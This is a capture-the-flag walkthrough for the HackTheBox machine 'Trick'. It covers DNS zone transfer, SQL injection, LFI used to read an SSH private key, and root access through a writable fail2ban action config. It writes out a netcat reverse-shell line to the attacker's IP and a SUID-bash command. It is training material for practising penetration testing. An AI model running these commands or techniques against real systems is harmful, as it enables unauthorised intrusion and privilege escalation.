# HackThBox - Trick

## NMAP

```bash
Nmap scan report for 10.129.85.201
Host is up (0.15s latency).
Not shown: 65531 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## PORT 80 (HTTP)

On the web page we see a bootstrap template which has nothing intersting

<img src="https://i.imgur.com/MwFbM4d.png"/>

Fuzzing for files and directories it didn't found anything as well

<img src="https://i.imgur.com/kRQgYfD.png"/>

## PORT 53 (DNS)

Having dns service running we can try to see if we can query dns records or perform dns zone transfer for that we need a domain name, we can get the domain by performing a reverse dns lookup which resolve IP to domain name

https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns

`dig -x 10.10.11.166 @10.10.11.166`

<img src="https://i.imgur.com/ba3zxyv.png"/>

Having the `trick.htb` we can add this in hosts file

<img src="https://i.imgur.com/jDSYKGt.png"/>

Now to enumerate further we can perform the dns zone transfer

<img src="https://i.imgur.com/Z3rUXsY.png"/>

This shows `root.trick.htb` subdomain but it doesn't take us anywhere, on performing zone transfer with `axfr`

<img src="https://i.imgur.com/4GZ7DZL.png"/>

We get another domain name `preprod-payroll.trick.htb`, so let's add this in hosts file as well

<img src="https://i.imgur.com/b52rmd1.png"/>

Visting this subdomain, we'll get a login page on which we can try default credentials 

<img src="https://i.imgur.com/s0rpUwi.png"/>

<img src="https://i.imgur.com/kxP8ZYp.png"/>

Which didn't worked, so next I tried sqli

<img src="https://i.imgur.com/scRFq1D.png"/>

That worked, so I tried running `sqlmap` but `time-based blind` so it's gonna take a lot of time in dumping the data

<img src="https://i.imgur.com/tyNa8sd.png"/>


## Foothold

Going back to the site we can see a GET parameter `page` fetching for pages, I tried to perform LFI on that parameter but it didn't worked

I tried running `wfuzz` against the parameter using LFI wordlist 

<img src="https://i.imgur.com/WkDekCt.png"/>

<img src="https://i.imgur.com/Sqj5dRC.png"/>

Which didn't worked but the web app had sql injection in ton of places, on viewing employee details intercepting the request, we'll get a GET parameter `id`  which also is vulnerable to sqli

<img src="https://i.imgur.com/yPxDULh.png"/>

<img src="https://i.imgur.com/0UaS1GK.png"/>

<img src="https://i.imgur.com/8HZLpuI.png"/>

It shows that it's boolean-blind as on the login page it was a time based sqli so with this we can perform LFI to read nginx vhost configuration file

<img src="https://i.imgur.com/tG0SIvk.png"/>

This shows another subdomain `preprod-marketing.trick.htb`

<img src="https://i.imgur.com/Khdf3CI.png"/>

Alternatively we can enumerate this subdomain by running wfuzz

<img src="https://i.imgur.com/7XJySOA.png"/>

<img src="https://i.imgur.com/cQwqVUW.png"/>

This loads up another site, having nothing special other than the same GET parameter, so I tried running LFI wordlist here as well

<img src="https://i.imgur.com/tFK97Q7.png"/>

<img src="https://i.imgur.com/qp24LsL.png"/>

This starts to give us some output on filterting the response

<img src="https://i.imgur.com/pVW4KjH.png"/>

We have the username `michael` , we can try to see if we can access his .ssh folder for `id_rsa`

<img src="https://i.imgur.com/KvmF2lj.png"/>

<img src="https://i.imgur.com/mfvA1DJ.png"/>

## Privilege Escalation

Running `sudo -l` to check if we can run with sudo privileges

<img src="https://i.imgur.com/JnQupEJ.png"/>

So we can restart the `fail2ban` service but we don't know exaclty what we need to edit, being in security group we can check what permissions this group has

<img src="https://i.imgur.com/mdqEqZn.png"/>

We have write access to this folder which has configuration files for fail2ban 

<img src="https://i.imgur.com/KAxu3kE.png"/>

I found an article explaining how we can abuse fail2ban config file 

https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7

For this we need to edit the `actionban` command in `iptables-multiport.conf`, so first let's copy this file in /tmp or other directory where we can edit it with a reverse shell

```bash
/usr/bin/nc 10.10.14.39 2222 -e /bin/bash
```

<img src="https://i.imgur.com/a7pYDLu.png"/>

After editing the config file, move it back to the action.d folder and restart fail2ban service

<img src="https://i.imgur.com/UVqiGM0.png"/>

Then start doing fail attempts on login, you'll get a reverse shell on your port

<img src="https://i.imgur.com/5XoSG2C.png"/>

But our reverse shell connection dies and the reason behind this is, the ban duration lasts for 10 seconds and bans the host after the 5th attempt

<img src="https://i.imgur.com/8dfOlrn.png"/>

Instead of getting a reverse shell we can just make bash a SUID with `chmod +s /bin/bash`

<img src="https://i.imgur.com/HJFuAxr.png"/>

Performing the invalid login attempts on ssh will trigger the fail2ban on the 5th invalid attempt

<img src="https://i.imgur.com/kw67ztg.png"/>

<img src="https://i.imgur.com/oqOCN4B.png"/>


## References

- https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns
- https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7
